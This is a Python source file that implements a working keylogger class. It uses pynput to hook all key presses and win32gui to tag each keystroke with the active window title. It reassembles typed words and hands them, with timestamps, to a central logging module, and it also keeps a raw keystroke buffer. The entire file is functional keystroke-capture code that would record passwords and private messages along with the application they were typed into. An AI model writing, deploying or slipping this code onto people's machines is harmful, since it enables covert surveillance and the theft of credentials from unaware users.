import threading
from pynput import keyboard
from datetime import datetime
import os
from collections import deque
import time
import logging

# Try to import win32gui for Windows, provide fallback for other OS
try:
    import win32gui
    WINDOWS = True
except ImportError:
    WINDOWS = False
    logging.warning("win32gui not available - window titles may be limited")

logger = logging.getLogger(__name__)

class Keylogger:
    def __init__(self, stop_event=None, buffer_size=100, word_timeout=2.0):
        self.stop_event = stop_event or threading.Event()
        self.current_window = ""
        self.listener = None
        self.current_word = []  # Buffer for current word
        self.key_buffer = deque(maxlen=buffer_size)  # Buffer for all keystrokes
        self.buffer_lock = threading.Lock()
        self.word_complete_keys = {'space', 'enter'}  # Keys that trigger word completion
        self.last_keypress = time.time()
        self.word_timeout = word_timeout  # Timeout in seconds
        self.word_timer_thread = None
        
    def start(self):
        """Start the keylogger"""
        try:
            # Start word timeout checker thread
            self.word_timer_thread = threading.Thread(target=self._check_word_timeout)
            self.word_timer_thread.daemon = True
            self.word_timer_thread.start()
            
            # Create keyboard listener
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            
            # Start listening
            self.listener.start()
            
            # Keep running until stop event is set
            while not self.stop_event.is_set():
                if self.listener and not self.listener.is_alive():
                    break
                self.stop_event.wait(1)
                
        except Exception as e:
            print(f"Keylogger error: {e}")
        finally:
            self.stop()

    def _check_word_timeout(self):
        """Check for word timeout and flush if needed"""
        while not self.stop_event.is_set():
            try:
                current_time = time.time()
                if (self.current_word and 
                    current_time - self.last_keypress >= self.word_timeout):
                    try:
                        import win32gui
                        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                    except:
                        window = "Unknown Window"
                    self._flush_word(window, "timeout")
                time.sleep(0.1)  # Check every 100ms
            except Exception as e:
                print(f"Error in word timeout checker: {e}")

    def get_window_title(self):
        """Get the current window title with proper error handling"""
        try:
            if WINDOWS:
                return win32gui.GetWindowText(win32gui.GetForegroundWindow())
            else:
                return "Unknown Window (Non-Windows OS)"
        except Exception as e:
            logger.error(f"Error getting window title: {e}")
            return "Unknown Window"

    def on_press(self, key):
        """Handle key press events"""
        try:
            # Get active window title using the new method
            window = self.get_window_title()
            
            # Format key press
            if hasattr(key, 'char'):
                key_pressed = key.char
            elif hasattr(key, 'name'):
                key_pressed = key.name
            else:
                key_pressed = str(key)

            # Update last keypress time
            self.last_keypress = time.time()

            # Handle word completion
            if key_pressed in self.word_complete_keys or key_pressed == 'enter':
                self._flush_word(window, key_pressed)
            elif key_pressed == 'backspace':
                if self.current_word:
                    self.current_word.pop() if self.current_word else None
            elif len(str(key_pressed)) == 1:  # Only add printable characters to word
                self.current_word.append(key_pressed)
            
            # Add to general key buffer
            with self.buffer_lock:
                self.key_buffer.append({
                    "window": window,
                    "key": key_pressed,
                    "timestamp": datetime.now().isoformat()
                })
            
        except Exception as e:
            logger.error(f"Error in key press handler: {e}")

    def _flush_word(self, window, completion_key):
        """Flush the current word buffer"""
        try:
            if self.current_word:
                word = ''.join(self.current_word)
                if word.strip():  # Only log non-empty words
                    from src.central_logger import central_logger
                    central_logger.log_event("keypress", {
                        "window": window,
                        "word": word,
                        "completion_key": completion_key,
                        "timestamp": datetime.now().isoformat()
                    })
                self.current_word = []  # Clear the word buffer
                
        except Exception as e:
            print(f"Error flushing word buffer: {e}")

    def on_release(self, key):
        """Handle key release events"""
        if self.stop_event.is_set():
            return False  # Stop listener
        return True

    def stop(self):
        """Stop the keylogger"""
        try:
            # Flush any remaining word
            if self.current_word:
                try:
                    import win32gui
                    window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                except:
                    window = "Unknown Window"
                self._flush_word(window, "stop")
            
            if self.listener:
                self.listener.stop()
            if self.stop_event:
                self.stop_event.set()
        except Exception as e:
            print(f"Error stopping keylogger: {e}")

if __name__ == "__main__":
    from threading import Event
    stop_event = Event()
    keylogger = Keylogger(stop_event)
    keylogger.start()
